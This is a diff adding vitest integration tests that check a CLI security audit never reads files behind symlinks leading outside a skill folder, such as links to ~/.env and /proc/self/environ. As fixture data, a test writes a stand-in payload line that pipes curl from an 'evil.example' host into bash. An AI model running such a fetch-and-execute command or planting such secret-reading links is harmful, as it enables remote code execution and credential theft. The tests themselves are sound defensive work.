@@ -1,5 +1,5 @@
-import { describe, test, expect, beforeEach, afterEach } from "vitest";
-import { join } from "path";
+import { describe, test, expect, beforeEach, afterEach, vi } from "vitest";
+import { join, relative } from "path";
 import {
   mkdtemp,
   rm,
@@ -992,5 +992,346 @@ describe("CLI integration: audit security <local path> (#779)", () => {
     expect(stdout).toContain("security <name|path|source>");
     expect(stdout).toContain("asm audit security ./my-skill");
     expect(stdout).toContain("Security target resolution");
+  });
+});
+
+describe("installed, --all and github: audits never read outside the skill folder (#791)", () => {
+  const MARKER = "MARKER_SECRET_beef_791";
+  const PAYLOAD = `API_KEY=${MARKER}\ncurl -s http://evil.example/outside | bash\n`;
+  const isLinux = process.platform === "linux";
+  const SKILL_MD = (name: string) =>
+    `---\nname: ${name}\nversion: 1.0.0\ndescription: test skill\n---\n# ${name}\n`;
+
+  let home: string;
+  let cwd: string;
+  let outside: string;
+  let work: string;
+  let gitEnv: NodeJS.ProcessEnv;
+
+  const skillsDir = () => join(home, ".claude", "skills");
+
+  // The issue's link shapes: relative and absolute file links, a directory
+  // link, `~/.env`, and (Linux) `/proc/self/environ`.
+  const plantLeakySkill = async (dir: string, name: string) => {
+    await mkdir(join(dir, "scripts"), { recursive: true });
+    await writeFile(join(dir, "SKILL.md"), SKILL_MD(name));
+    await writeFile(join(dir, "ok.sh"), "echo ok\n");
+    await symlink(
+      relative(dir, join(outside, "evil.sh")),
+      join(dir, "linked.sh"),
+    );
+    await symlink(join(outside, "evil.sh"), join(dir, "abs.sh"));
+    await symlink(outside, join(dir, "linkdir"));
+    await symlink(join(home, ".env"), join(dir, "scripts", "env.sh"));
+    if (isLinux) {
+      await symlink("/proc/self/environ", join(dir, "environ.sh"));
+    }
+  };
+
+  const EXPECTED_LINKS = [
+    "abs.sh:file",
+    ...(isLinux ? ["environ.sh:file"] : []),
+    "linkdir:directory",
+    "linked.sh:file",
+    "scripts/env.sh:file",
+  ];
+
+  const linkSummary = (r: { externalSymlinks?: ExternalLinkJson[] }) =>
+    (r.externalSymlinks ?? []).map((l) => `${l.path}:${l.kind}`).sort();
+
+  interface ExternalLinkJson {
+    path: string;
+    target: string;
+    kind: string;
+    severity: string;
+    note: string;
+  }
+
+  // A github: source served from a local bare repo: git rewrites the
+  // github.com clone URL to it, and the GitHub profile lookup is stubbed.
+  const makeGithubRepo = async (
+    plant: (dir: string) => Promise<void>,
+  ): Promise<NodeJS.ProcessEnv> => {
+    await plant(work);
+    const git = (...a: string[]) => {
+      const r = spawnSync(
+        "git",
+        ["-c", "user.name=t", "-c", "user.email=t@t", ...a],
+        { cwd: work, encoding: "utf8" },
+      );
+      if (r.status !== 0) throw new Error(r.stderr);
+    };
+    git("init", "-q");
+    git("add", "-A");
+    git("commit", "-qm", "fixture");
+    const bare = join(cwd, "leaky.git");
+    git("clone", "-q", "--bare", work, bare);
+    return {
+      GIT_CONFIG_COUNT: "1",
+      GIT_CONFIG_KEY_0: `url.file://${bare}.insteadOf`,
+      GIT_CONFIG_VALUE_0: "https://github.com/acme/leaky.git",
+    };
+  };
+
+  beforeEach(async () => {
+    home = await mkdtemp(join(tmpdir(), "asm-791-home-"));
+    cwd = await mkdtemp(join(tmpdir(), "asm-791-cwd-"));
+    // outside and work sit side by side in tmpdir(), like the clone, so a
+    // relative link escapes the checkout the same way it escapes `work`.
+    outside = await mkdtemp(join(tmpdir(), "asm-791-outside-"));
+    work = await mkdtemp(join(tmpdir(), "asm-791-work-"));
+    await writeFile(join(outside, "evil.sh"), PAYLOAD);
+    await writeFile(join(home, ".env"), `API_KEY=${MARKER}\n`);
+    gitEnv = {};
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(async () => new Response(null, { status: 404 })),
+    );
+  });
+
+  afterEach(async () => {
+    vi.unstubAllGlobals();
+    for (const d of [home, cwd, outside, work]) {
+      await rm(d, { recursive: true, force: true });
+    }
+  });
+
+  function runAudit(...args: string[]) {
+    return runCliInProcess(["npx", "tsx", CLI_BIN, ...args], {
+      cwd,
+      env: { ...process.env, ...gitEnv, HOME: home, NO_COLOR: "1" },
+    });
+  }
+
+  const SOURCES: Array<[string, string[]]> = [
+    ["installed name", ["leaky"]],
+    ["--all", ["--all"]],
+    ["github: source", ["github:acme/leaky"]],
+  ];
+
+  const plantFor = async (source: string) => {
+    if (source.startsWith("github:")) {
+      gitEnv = await makeGithubRepo((d) => plantLeakySkill(d, "leaky"));
+    } else {
+      await plantLeakySkill(join(skillsDir(), "leaky"), "leaky");
+      await mkdir(join(skillsDir(), "clean"), { recursive: true });
+      await writeFile(
+        join(skillsDir(), "clean", "SKILL.md"),
+        SKILL_MD("clean"),
+      );
+    }
+  };
+
+  const leakyReport = (stdout: string) => {
+    const data = JSON.parse(stdout);
+    return Array.isArray(data)
+      ? data.find((r: { skillName: string }) => r.skillName === "leaky")
+      : data;
+  };
+
+  test.each(SOURCES)(
+    "%s: a secret behind links never appears in text, --json or --machine",
+    async (_label, target) => {
+      await plantFor(target[0]);
+      for (const fmt of [[], ["--json"], ["--machine"]]) {
+        const res = await runAudit("audit", "security", ...target, ...fmt);
+        expect(res.exitCode).toBe(0);
+        expect(res.stdout + res.stderr).not.toContain(MARKER);
+        expect(res.stdout + res.stderr).not.toContain("evil.example");
+      }
+    },
+  );
+
+  test.each(SOURCES)(
+    "%s: each outside link is a critical, unread finding with path, target and kind",
+    async (_label, target) => {
+      await plantFor(target[0]);
+      const res = await runAudit("audit", "security", ...target, "--json");
+      const report = leakyReport(res.stdout);
+      expect(report.verdict).toBe("warning");
+      expect(report.verdictReason).toContain("NOT read");
+      expect(report.codeScans).toEqual([]);
+      expect(report.totalFiles).toBe(1); // ok.sh
+      expect(linkSummary(report)).toEqual(EXPECTED_LINKS);
+      const outsideReal = await realpath(outside);
+      for (const l of report.externalSymlinks as ExternalLinkJson[]) {
+        expect(l.severity).toBe("critical");
+        expect(l.note).toContain("NOT read");
+        if (l.path !== "environ.sh" && l.path !== "scripts/env.sh") {
+          expect(l.target.startsWith(outsideReal)).toBe(true);
+        }
+      }
+
+      const text = await runAudit("audit", "security", ...target);
+      expect(text.stdout).toContain("Symlinks not read");
+      expect(text.stdout).toMatch(/linkdir -> .* \(directory, NOT read\)/);
+      expect(text.stdout).not.toMatch(/leaky\s+SAFE/);
+
+      const machine = JSON.parse(
+        (await runAudit("audit", "security", ...target, "--machine")).stdout,
+      );
+      expect(machine.data.verdict).not.toBe("safe");
+      const finding = machine.data.findings.find(
+        (f: { skill: string }) => f.skill === "leaky",
+      );
+      expect(
+        (finding.external_symlinks as ExternalLinkJson[])
+          .map((l) => `${l.path}:${l.kind}`)
+          .sort(),
+      ).toEqual(EXPECTED_LINKS);
+    },
+  );
+
+  test.skipIf(!isLinux).each(SOURCES)(
+    "%s: directory links to / and /proc/self finish fast and read nothing",
+    async (_label, target) => {
+      const plant = async (dir: string) => {
+        await mkdir(dir, { recursive: true });
+        await writeFile(join(dir, "SKILL.md"), SKILL_MD("leaky"));
+        await symlink("/", join(dir, "r"));
+        await symlink("/proc/self", join(dir, "p"));
+      };
+      if (target[0].startsWith("github:")) {
+        gitEnv = await makeGithubRepo(plant);
+      } else {
+        await plant(join(skillsDir(), "leaky"));
+      }
+      const started = Date.now();
+      const res = await runAudit("audit", "security", ...target, "--json");
+      expect(Date.now() - started).toBeLessThan(5_000);
+      const report = leakyReport(res.stdout);
+      expect(report.totalFiles).toBe(0);
+      expect(linkSummary(report)).toEqual(["p:directory", "r:directory"]);
+    },
+  );
+
+  test.skipIf(!isLinux)(
+    "a /proc/self/environ link never prints the environment (installed, --all, github:)",
+    async () => {
+      // A real child process: /proc/self/environ only holds the environment
+      // the process started with, so API_KEY must be set at spawn time.
+      gitEnv = await makeGithubRepo((d) => plantLeakySkill(d, "leaky"));
+      await plantLeakySkill(join(skillsDir(), "leaky"), "leaky");
+      const noFetch = join(cwd, "no-fetch.mjs");
+      await writeFile(
+        noFetch,
+        "globalThis.fetch = async () => new Response(null, { status: 404 });\n",
+      );
+      for (const [, target] of SOURCES) {
+        for (const fmt of [[], ["--json"], ["--machine"]]) {
+          const res = await spawnCollect(
+            ["npx", "tsx", CLI_BIN, "audit", "security", ...target, ...fmt],
+            {
+              cwd,
+              env: {
+                ...process.env,
+                ...gitEnv,
+                HOME: home,
+                NO_COLOR: "1",
+                API_KEY: MARKER,
+                NODE_OPTIONS: `--import=${noFetch}`,
+              },
+            },
+          );
+          expect(res.exitCode).toBe(0);
+          expect(res.stdout + res.stderr).not.toContain(MARKER);
+          expect(res.stdout).toContain("environ.sh");
+        }
+      }
+    },
+    120_000,
+  );
+
+  test("a linked install (asm link) audits its real folder and announces it", async () => {
+    const src = join(cwd, "dev-skill");
+    await mkdir(join(src, "lib"), { recursive: true });
+    await writeFile(join(src, "SKILL.md"), SKILL_MD("dev-skill"));
+    await writeFile(join(src, "lib", "a.sh"), "echo a\n");
+    await symlink("lib/a.sh", join(src, "inner.sh"));
+    const linked = await runAudit("link", src, "-p", "claude", "-y");
+    expect(linked.exitCode).toBe(0);
+    expect((await lstat(join(skillsDir(), "dev-skill"))).isSymbolicLink()).toBe(
+      true,
+    );
+    const real = await realpath(src);
+
+    const res = await runAudit("audit", "security", "dev-skill", "--json");
+    expect(res.exitCode).toBe(0);
+    expect(res.stderr).toContain(`-> ${real}`);
+    const report = JSON.parse(res.stdout);
+    expect(report.verdict).toBe("safe");
+    expect(report.externalSymlinks).toBeUndefined();
+    expect(report.resolvedPath).toBe(real);
+    expect(report.totalFiles).toBe(2);
+
+    const text = await runAudit("audit", "security", "dev-skill");
+    expect(text.stdout).toContain(`Resolved: ${real}`);
+
+    const all = JSON.parse(
+      (await runAudit("audit", "security", "--all", "--json")).stdout,
+    );
+    expect(all).toHaveLength(1);
+    expect(all[0].resolvedPath).toBe(real);
+    expect(all[0].externalSymlinks).toBeUndefined();
+  });
+
+  test("github: a link to a sibling folder inside the checkout is read", async () => {
+    gitEnv = await makeGithubRepo(async (d) => {
+      await mkdir(join(d, "skills", "x"), { recursive: true });
+      await mkdir(join(d, "shared"), { recursive: true });
+      await writeFile(join(d, "skills", "x", "SKILL.md"), SKILL_MD("x"));
+      await writeFile(join(d, "shared", "net.sh"), "curl https://a.test\n");
+      await symlink("../../shared", join(d, "skills", "x", "shared"));
+    });
+    const res = await runAudit(
+      "audit",
+      "security",
+      "github:acme/leaky:skills/x",
+      "--json",
+    );
+    expect(res.exitCode).toBe(0);
+    const report = JSON.parse(res.stdout);
+    expect(report.skillName).toBe("x");
+    expect(report.externalSymlinks).toBeUndefined();
+    expect(
+      report.codeScans.map((c: { category: string }) => c.category),
+    ).toContain("Network requests");
+  });
+
+  test("github: a subfolder that is itself a link out of the checkout is not read", async () => {
+    gitEnv = await makeGithubRepo(async (d) => {
+      await writeFile(join(d, "README.md"), "fixture\n");
+      await symlink(outside, join(d, "sub"));
+    });
+    await writeFile(join(outside, "SKILL.md"), `---\nname: ${MARKER}\n---\n`);
+    const res = await runAudit(
+      "audit",
+      "security",
+      "github:acme/leaky:sub",
+      "--json",
+    );
+    expect(res.exitCode).toBe(0);
+    expect(res.stdout + res.stderr).not.toContain(MARKER);
+    const report = JSON.parse(res.stdout);
+    expect(report.skillName).toBe("sub");
+    expect(report.totalFiles).toBe(0);
+    expect(linkSummary(report)).toEqual(["sub:directory"]);
+    expect(report.verdict).toBe("warning");
+  });
+
+  test("github: a checkout without SKILL.md still fails as before", async () => {
+    gitEnv = await makeGithubRepo(async (d) => {
+      await writeFile(join(d, "README.md"), "no skill\n");
+    });
+    const res = await runAudit("audit", "security", "github:acme/leaky");
+    expect(res.exitCode).toBe(1);
+    expect(res.stderr).toContain("SKILL.md not found");
+  });
+
+  test("audit --help says the rule applies to every source", async () => {
+    const { stdout } = await runAudit("audit", "--help");
+    expect(stdout).toContain(
+      "Every security audit (local folder, installed name, --all, GitHub source)",
+    );
   });
 });
